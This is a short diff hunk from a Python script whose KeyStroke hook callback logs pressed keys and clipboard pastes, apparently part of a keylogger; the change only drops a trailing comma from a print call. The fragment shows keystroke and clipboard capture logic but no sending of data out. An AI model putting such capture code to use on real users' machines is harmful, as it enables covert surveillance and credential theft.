@@ -51,7 +51,7 @@ def KeyStroke(event):
             win32clipboard.CloseClipboard()
             print("[PASTE] - %s" % (pasted_value),)
         else:
-            print("[%s]" % (event.Key),)
+            print("[%s]" % (event.Key))
     return True
 
 # create and register a hook manager, execute forever
